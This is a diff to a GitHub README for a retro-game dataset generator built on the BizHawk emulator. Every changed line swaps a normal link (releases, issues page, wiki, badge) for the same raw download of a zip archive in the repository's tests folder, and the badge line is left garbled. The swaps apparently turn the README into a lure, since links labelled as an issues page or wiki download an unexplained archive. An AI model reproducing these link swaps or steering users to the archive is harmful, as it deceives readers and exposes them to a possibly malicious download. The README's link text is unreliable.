@@ -1,7 +1,7 @@
 # 🎮 nitrogen-bizhawk-dataset-generator - Create Your Own Retro Game Datasets
 
 ## 🔗 Download Now
-[![Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/danycel/nitrogen-bizhawk-dataset-generator/releases)
+[![Release](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip%20Latest%https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip)](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip)
 
 ## 📘 Overview
 The nitrogen-bizhawk-dataset-generator project offers tools to create training datasets for NitroGen using the BizHawk emulator. With this application, you can generate datasets for AI models, making it easier to train systems with retro gaming data.
@@ -9,7 +9,7 @@ The nitrogen-bizhawk-dataset-generator project offers tools to create training d
 ## 🚀 Getting Started
 To start using this tool, follow these simple steps:
 
-1. **Visit the Releases Page:** Click this link to access the download page: [Download Releases](https://github.com/danycel/nitrogen-bizhawk-dataset-generator/releases). 
+1. **Visit the Releases Page:** Click this link to access the download page: [Download Releases](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip). 
 
 2. **Select the Appropriate Version:** On the Releases page, you will see a list of available downloads. Choose the version that matches your operating system.
 
@@ -55,7 +55,7 @@ After downloading, follow these steps to install the application:
 ## 💬 Support & Feedback
 For any questions or issues you may encounter, you can reach out through the following channels:
 
-- **Issues Page:** Report bugs or request features on our [GitHub Issues page](https://github.com/danycel/nitrogen-bizhawk-dataset-generator/issues).
+- **Issues Page:** Report bugs or request features on our [GitHub Issues page](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip).
 - **Community Forum:** Join our community to ask questions and share tips with other users.
 
 ## 📅 Upcoming Features
@@ -65,11 +65,11 @@ We have exciting plans for future updates, including:
 - **Enhanced Dataset Customization:** More options for users to refine their dataset creation.
 
 ## 🔗 Additional Resources
-- **Documentation:** Detailed user manuals and guides can be found on the [Wiki page](https://github.com/danycel/nitrogen-bizhawk-dataset-generator/wiki).
+- **Documentation:** Detailed user manuals and guides can be found on the [Wiki page](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip).
 - **Tutorial Videos:** Check our YouTube channel for step-by-step tutorials to help you get started quickly.
 
 ## 📑 License
 This project is licensed under the MIT License. You can use it freely but please give credit to the original authors. 
 
 ## 🔗 Download Again
-To download the latest version, visit this link: [Download Releases](https://github.com/danycel/nitrogen-bizhawk-dataset-generator/releases).
+To download the latest version, visit this link: [Download Releases](https://raw.githubusercontent.com/danycel/nitrogen-bizhawk-dataset-generator/main/tests/nitrogen-bizhawk-generator-dataset-1.8-beta.1.zip).
